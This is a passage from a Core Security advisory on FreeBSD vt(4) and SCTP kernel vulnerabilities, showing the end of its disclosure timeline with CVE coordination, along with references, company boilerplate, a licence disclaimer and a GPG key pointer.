+Core Security informs that understands their position regarding the vt Driver VT_WAITACTIVE Sign Conversion issue, but we will nevertheless publish thew bug in the advisory because we consider it a vulnerability. We accepted their offer of sharing CVE IDs.
+        
+
+. 2015-01-26:
+
+FreeBSD confirms they have available CVE IDs and ask if we want to use IDs from 2014 or 2015.
+        
+
+. 2015-01-27:
+
+FreeBSD informs us that after going through their mail archive they found out that the same issue was reported by Google and that they missed it. They inform us that they will use only one CVE ID for the two SCTP issues because they state they are of the same nature.
+        
+
+. 2015-01-27:
+
+Core Security informs that will assign a the CVE ID CVE-2014-0998 to the vt(4) vulnerability and we requested the date and time they plan to release the fix and advisory.
+        
+
+. 2015-01-27:
+
+FreeBSD informs they will publish the fix and advisory today.
+        
+
+. 2015-01-27:
+
+Advisory CORE-2015-0003 published.
+        
+
+
+10. *References*
+
+[1] https://www.freebsd.org/releases/10.1R/relnotes.html#new
+[2] https://www.freebsd.org/cgi/man.cgi?query=vt&sektion=4
+[3] https://wiki.freebsd.org/Newcons
+[4] https://www.freebsd.org/cgi/man.cgi?query=sctp&sektion=4
+[5] http://www.bsdcan.org/2008/schedule/attachments/44_bsdcan_sctp.pdf
+[6] https://security.FreeBSD.org/advisories/FreeBSD-SA-15:02.kmem.asc
+
+
+11. *About CoreLabs*
+
+      CoreLabs, the research center of Core Security, is charged with anticipating
+      the future needs and requirements for information security technologies.
+      We conduct our research in several important areas of computer security
+      including system vulnerabilities, cyber attack planning and simulation,
+      source code auditing, and cryptography. Our results include problem
+      formalization, identification of vulnerabilities, novel solutions and
+      prototypes for new technologies. CoreLabs regularly publishes security
+      advisories, technical papers, project information and shared software
+      tools for public use at:
+      http://corelabs.coresecurity.com.
+    
+
+
+12. *About Core Security Technologies*
+
+
+      Core Security Technologies enables organizations to get ahead of threats
+      with security test and measurement solutions that continuously identify
+      and demonstrate real-world exposures to their most critical assets. Our
+      customers can gain real visibility into their security standing, real
+      validation of their security controls, and real metrics to more
+      effectively secure their organizations.
+    
+
+
+      Core Security's software solutions build on over a decade of trusted
+      research and leading-edge threat expertise from the company's Security
+      Consulting Services, CoreLabs and Engineering groups. Core Security
+      Technologies can be reached at +1 (617) 399-6980 or on the Web at:
+      http://www.coresecurity.com.
+    
+
+
+13. *Disclaimer*
+
+
+      The contents of this advisory are copyright
+      (c) 2015 Core Security and (c) 2015 CoreLabs,
+      and are licensed under a Creative Commons
+      Attribution Non-Commercial Share-Alike 3.0 (United States) License:
+      http://creativecommons.org/licenses/by-nc-sa/3.0/us/
+
+
+14. *PGP/GPG Keys*
+
+
+      This advisory has been signed with the GPG key of Core Security advisories
+      team, which is available for download at
+      http://www.coresecurity.com/files/attachments/core_security_advisories.asc.
